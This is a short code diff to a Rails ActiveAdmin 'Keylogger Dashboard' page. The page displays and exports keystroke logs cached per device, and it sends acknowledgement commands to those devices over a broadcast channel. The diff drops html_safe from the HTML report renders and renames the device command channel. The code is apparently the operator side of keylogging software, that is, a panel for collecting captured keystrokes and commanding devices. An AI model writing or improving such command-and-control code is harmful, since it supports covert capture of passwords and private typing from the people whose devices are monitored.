@@ -132,7 +132,7 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
     cached = Rails.cache.read("keylog_#{params[:device_id]}")
     if cached
       processor = KeylogProcessor.new(cached[:data])
-      render html: processor.to_html_report.html_safe
+      render html: processor.to_html_report
     else
       redirect_to admin_keylogger_dashboard_path, alert: 'No data'
     end
@@ -151,7 +151,7 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
       when 'csv'
         send_data processor.to_csv, filename: "keylog_#{params[:device_id]}_#{Time.current.to_i}.csv", type: 'text/csv'
       when 'html'
-        render html: processor.to_html_report.html_safe
+        render html: processor.to_html_report
       end
     else
       redirect_to admin_keylogger_dashboard_path, alert: 'No data'
@@ -160,7 +160,7 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
 
   page_action :ack_keylog, method: :post do
     success = params[:success] == 'true'
-    ActionCable.server.broadcast("device_#{params[:device_id]}", { command: 'keylog_ack', data: { success: success, timestamp: Time.current.to_i } })
+    ActionCable.server.broadcast("commands_#{params[:device_id]}", { command: 'keylog_ack', data: { success: success, timestamp: Time.current.to_i } })
     Rails.cache.delete("keylog_#{params[:device_id]}") if success
     redirect_to admin_keylogger_dashboard_path, notice: "ACK sent to #{params[:device_id][0..7]}"
   end
